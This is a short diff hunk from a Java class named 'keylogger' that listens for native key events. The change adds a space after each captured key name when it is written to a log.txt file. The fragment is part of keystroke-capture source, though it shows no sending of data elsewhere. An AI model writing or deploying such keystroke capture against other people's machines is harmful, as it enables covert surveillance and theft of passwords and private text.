@@ -22,7 +22,7 @@ public class keylogger implements NativeKeyListener {
 		try {
 
 			FileWriter w = new FileWriter(index + "log.txt", true);
-			w.write(e.getKeyText(e.getKeyCode()));
+			w.write(e.getKeyText(e.getKeyCode()) + " ");
 			w.close();
 
 		} catch (IOException ex) {
